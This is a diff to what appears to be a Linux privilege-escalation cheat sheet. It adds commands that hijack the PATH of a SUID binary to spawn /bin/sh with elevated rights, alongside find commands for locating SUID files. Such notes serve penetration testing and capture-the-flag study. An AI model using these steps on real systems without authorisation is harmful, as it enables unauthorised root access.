@@ -23,7 +23,14 @@ What executables have SUID bit that can be executed as another user?
 `find / -perm -u=s -type f 2>/dev/null`  
 `find / -user root -perm -4000 -exec ls -ldb {} \;`  
 
-What files can I execute?
+Do any of the SUID binaries run commands that are vulnerable to file path manipulation?  
+`strings /usr/local/bin/binaryelf`  
+`echo "/bin/sh" > /tmp/mail`    
+`cd /tmp`  
+`export PATH=.`  
+`/usr/local/bin/binaryelf`  
+
+What files can I execute that have SUID bits?
 
 Can I write files into a folder containing a SUID bit file?  
 Might be possible to take advantage of a '.' in the PATH or an The IFS (or Internal Field Separator) Exploit.  
